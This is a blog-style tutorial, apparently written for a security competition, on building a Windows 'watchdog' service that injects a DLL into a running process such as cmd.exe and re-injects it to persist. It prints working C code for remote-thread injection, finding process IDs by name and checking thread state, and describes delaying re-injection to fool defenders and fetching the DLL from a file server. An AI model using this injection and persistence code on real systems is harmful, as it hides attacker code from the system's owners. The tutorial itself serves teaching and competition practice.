# Process Watchdog
*Writen by: Jon Bauer*

https://github.com/f1rehaz4rd/project link

## Disclaimer
**Do not use this code for any malicious purposes. This code was designed for a competition environment and has a purpose of teaching.**

## Where the idea came from 
DLL injection is a very popular tactic for hiding custom made DLLs as a thread inside another process. This is extremely useful for hiding code where it shouldn't be. There is nothing new about this, but I had a thought to take this a step further. 

This once the the injector is run, which I will briefly go over later, the remote thread for the process is started and left to do its thing. What happens when the system is restarted though? This can cause the process to be killed along with the thread that was we injected into it. 

This is where the idea that I had begun. I wanted to make the process persistent upon reboot. There are many differnt ways that you can make programs persist on reboot, but the way that I decided would be most effective for this was a service. This is where the decision was made to make a Windows service that not only did the injection, but then watched the thread to ensure that it would stay injected no matter what. 

## Summary of the Project
This project is a Windows service that interacts with the WINAPI functions directly inorder watch and mantain the state of the injected DLL. The logic of it is to inject the DLL and store the thread handler that the function returns. It then sleeps for a given amount of time before it checks if the thread is still created and in a running state. If it is not, then the service will reinject the DLL into the given set of processes. If the DLL happens to no longer be on the system, it will then pull it down from a file server to ensure persistence. 

## The Injection
I will be breifly going over the functions as a refresher to those who are familiar and teaching those who don't know about them. This will not be the focus of the post so there will not be extreme detail on them as you can find them here https://docs.microsoft.com/en-us/.

The functions need to be called in this order for them to work and also need to have a live process id in order to complete this action:
* OpenProcess()
* GetProcAddress()
* VirtualAllocEx()
* WriteProcessMemory()
* CreateRemoteThread()

To do the injection we are going to try to inject into the cmd.exe process with a high integerity level. We want to try to inject into a process with the highest level integerity that we can find. 

---insert picture 1 here---

We notice that it has a process ID of '2980' which we will be using to try to inject into. We will save this to a variable and then try to call OpenProcess(). We need to make sure that you are the same level or high then the process you are injecting into. It will look like this.

```
    int procID = 2980;
	// Opens the process with the target ID
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (process == NULL) {
		printf("\t[!] Error: Could not find or open process: %d\n", procID);
		return 0;
	}
    else {
		printf("\t[*] Sucessfully openned process with ID: %d\n", procID);
	}
```

Once we are sure that the process is open then we can run all the other commands which will inject our given DLL. I will not be going over what these commands do exactly, but Did write some error checking for them to help debug if anything went wrong. 

```
	// Gets the address to create the thread
	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (addr == NULL) {
		printf("\t[!] Error: Could not get the process address\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully obtained the process addr: %d\n", addr);
	}

	// Allocate memory for the process
	LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("\t[!] Error: the memory could not be allocated inside the chosen process.\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully alloced memory: %d\n", arg);
	}

	// Write the process to memory
	int n = WriteProcessMemory(process, arg, dllPath, strlen(dllPath), NULL);
	if (n == 0) {
		printf("\t[!] Error: there was no bytes written to the process's address space.\n");
		return 0;
	}
	else {
		printf("\t[*] Sucessfully wrote to process memory\n");
	}

	// Create the thread which starts the DLL
	HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, NULL, NULL);
	if (threadID == NULL) {
		printf("\t[!] Error: the remote thread could not be created.\n");
		return 0;
	}
	else {
		printf("\t[+] Success, the remote thread was successfully created: %d\n", threadID);
	}
    
    CloseHandle(process);
```

Now to where we start the next step, watching the process.

## The Watching
So now the question is how do we watch it? We have to make sure that the program never ends by putting it in an infinite while-loop. For performance purposes we do need to put a bit of a sleep on it so that it isn't constantly checking. Plus if someone does end up finding it we don't want the thread to be spun up right away. We want to make them think it is gone before we start another one. For this article we will stick to one process, but you can make it choose from an array of processes at random. 

So how do we go about doing that. First we need to find out:
* How to find a process ID by name?
* How do we check if the DLL is running or not?
* How do we check if the DLL is still on the system?

These are all very important for health checks of the program. If one of these doesn't exist the service will not be as strong as it can be. 

### Finding the Process ID
If they close the process or restart it will have a different process ID but will always have the same name. For example, cmd.exe. How will this work? There are WINAPIs that will search through the processes running on the system that we can iterate through until we have a match for the name.

For good practice and easy of use I put this code in a function called FindProcessID, which takes in a variable of type const wstring. A wstring is just a special string that the WINAPI uses to interact with the system better. This function will then return a type DWORD which is another one of those fancy WINAPI variables that can be treated like an integer for our purposes.

We will be creating a new HANDLE with the CreateToolhelp32Snaphot() function (documentation on it here https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot). When passing it NULL we will get a large list of the processes that are running on the system. We will then use Process32First() to get the first process and check the name, and then Process32Next() in a while loop until we run out. This is going to allow use to visit each of the processes that are running on the system. For this example we will be using cmd.exe, but in use I would recommend a process that is always going to be running on the target system. 

If we find the target process, the functino will return the ID of it so that we can pass it into an inject function that we wrote above. If there is a chance that it doesn't find the ID it will return a 0.

```
DWORD FindProcessId(const std::wstring& processName) 
{
	// Sets up the ProcessEntry object and allocates the space for it
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	// Sets up the Handler and gets thhe processes
	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE) {
		return 0;
	}

	// Checks the first process and checks if the name matches
	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile)) {
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	// Checks the rest of the processes and checks if their name matches
	while (Process32Next(processesSnapshot, &processInfo)) {
		if (!processName.compare(processInfo.szExeFile)) {
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	// Closes the handler
	CloseHandle(processesSnapshot);
	return 0;
}
```
### Checking the Thread
The injection is now covered along with a way to dynamically find processes IDs by name. Next step in the watchdog process is to verify that the process is still running after we have spun the thread up. 

To do this is actually quite simple. The CreateRemoteThread() function returns the thread handler, which conviently has all of the information that is needed to learn about the thread. Your injection function should return this HANDLE so that it can be used for this step of checking. 

There is a WINAPI function that you called WaitForSingleObject() which will return the current state of the HANDLE at the time it was called (more information about it here https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject). With this we can pass it the thread handler that we got from before and determine if it is still running or not. If the HANDLE returns a WAIT_OBJECT_0, then the thread is dead and we are going to have to start it back up again. otherwise it is in some other state, running or suspended. Part of the my research that I couldn't get working is how to check if the thread is actually suspended so if it is not dead, I resume it, which doesn't do anything if it is running, and then return that the thread is alive. 

```
DWORD IsAlive(HANDLE threadHandle)
{
	// Checks if the process is running or suspended
	DWORD result = WaitForSingleObject(threadHandle, 0);
	if (result == WAIT_OBJECT_0) {
		// the thread handle is signaled - the thread has terminated
		return 0;
	}
	else {
		// the thread handle is not signaled - the thread is still alive
		result = ResumeThread(threadHandle); // Resumes it incase it is suspended
		return 1;
	}
}
```

